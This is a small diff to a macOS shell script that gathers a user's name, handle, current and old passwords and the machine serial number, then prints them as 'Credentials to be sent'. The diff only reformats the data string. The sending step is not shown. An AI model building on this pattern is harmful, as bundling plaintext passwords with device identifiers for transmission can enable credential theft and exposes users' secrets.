@@ -7,7 +7,7 @@ password=$3
 oldpassword=$4
 serialNumber=$(ioreg -l | awk '/IOPlatformSerialNumber/ { print $4;}' | sed -e 's/^"//' -e 's/"$//')
 
-data="[name: $fullname] [handle: $handle] [password: $password] [oldpassword: $oldpassword] [serialNumber: $serialNumber]"
+data="{name: $fullname, handle: $handle, password: $password, oldpassword: $oldpassword, serialNumber: $serialNumber}"
 
 printf "\nCredentials to be sent:\n
 Full name: $fullname\nHandle: $handle\nPassword: $password\nOldpassowrd: $oldpassword\nserialNumber: $serialNumber\n\n"
